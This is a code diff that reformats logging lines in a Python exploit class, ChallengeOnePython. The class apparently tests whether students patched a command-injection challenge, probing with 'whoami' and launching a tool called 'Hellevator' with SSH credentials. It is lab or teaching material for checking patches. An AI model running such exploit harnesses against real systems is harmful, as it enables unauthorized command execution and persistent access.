@@ -32,24 +32,18 @@ class ChallengeOnePython(Exploit):
 
         # ensure "ls" works properly
         if "pvuln2_wrapper.py" not in socket_response:
-            logger.info(
-                f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeOnePython so 'ls' no longer outputs correctly!{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - The student incorrectly patched ChallengeOnePython so 'ls' no longer outputs correctly!{BetterLogger.COLOR_END}")
             raise IncorrectPatchException()
 
         try:
-            server_output = (
-                socket_response.split("0x1x2x3")[1].strip()
-            )  # split on `0x1x2x3` so we can parse for the command injection output
+            server_output = socket_response.split("0x1x2x3")[1].strip()  # split on `0x1x2x3` so we can parse for the command injection output
             return server_output
         except IndexError:
             raise PatchedException(f"{self.ip_address} - The target is patched")
 
     def run_hellevator(self):
         try:
-            logger.info(
-                f"{self.ip_address} - Running Hellevator via ChallengeOnePython..."
-            )
+            logger.info(f"{self.ip_address} - Running Hellevator via ChallengeOnePython...")
 
             username = self.parsed_config["ssh_username"]
             password = self.parsed_config["ssh_password"]
@@ -59,30 +53,20 @@ class ChallengeOnePython(Exploit):
             server_response_text = self.run_command(command=download_hellevator_command)
             # logger.debug(f"server_response_text is `{server_response_text}`")
             if ssh_key in server_response_text:
-                logger.info(
-                    f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via ChallengeOnePython!{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_BLUE}{self.ip_address} - Successfully executed Hellevator via ChallengeOnePython!{BetterLogger.COLOR_END}")
                 return True
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeOnePython!{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeOnePython!{BetterLogger.COLOR_END}")
             return False
         except IncorrectPatchException:
             return None
         except ConnectionRefusedError:
-            logger.info(
-                f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeOnePython because the pvuln2_wrapper is not running!{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeOnePython because the pvuln2_wrapper is not running!{BetterLogger.COLOR_END}")
             return None
         except PatchedException:
-            logger.info(
-                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeOnePython.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeOnePython.{BetterLogger.COLOR_END}")
             return False
         except Exception as err:
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeOnePython.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while executing Hellevator via ChallengeOnePython.{BetterLogger.COLOR_END}")
             logger.exception(err)
             return False
 
@@ -91,31 +75,21 @@ class ChallengeOnePython(Exploit):
         Returns True if vulnerable and False if not
         """
         try:
-            logger.info(
-                f"{self.ip_address} - Testing if the target is vulnerable to ChallengeOnePython..."
-            )
+            logger.info(f"{self.ip_address} - Testing if the target is vulnerable to ChallengeOnePython...")
             command = "whoami"
             try:
                 self.run_command(command=command)
-                logger.info(
-                    f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeOnePython!{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_GREEN}{self.ip_address} - The target is vulnerable to ChallengeOnePython!{BetterLogger.COLOR_END}")
                 return True
             except IncorrectPatchException:
                 return False
             except ConnectionRefusedError:
-                logger.info(
-                    f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeOnePython because the pvuln2_wrapper is not running!{BetterLogger.COLOR_END}"
-                )
+                logger.info(f"{BetterLogger.COLOR_PINK}{self.ip_address} - Unable to test ChallengeOnePython because the pvuln2_wrapper is not running!{BetterLogger.COLOR_END}")
                 return None
         except PatchedException:
-            logger.info(
-                f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeOnePython.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_YELLOW}{self.ip_address} - The target is not vulnerable to ChallengeOnePython.{BetterLogger.COLOR_END}")
             return False
         except Exception as err:
-            logger.info(
-                f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeOnePython is vulnerable.{BetterLogger.COLOR_END}"
-            )
+            logger.info(f"{BetterLogger.COLOR_RED}{self.ip_address} - Something went wrong while checking if ChallengeOnePython is vulnerable.{BetterLogger.COLOR_END}")
             logger.exception(err)
             return False
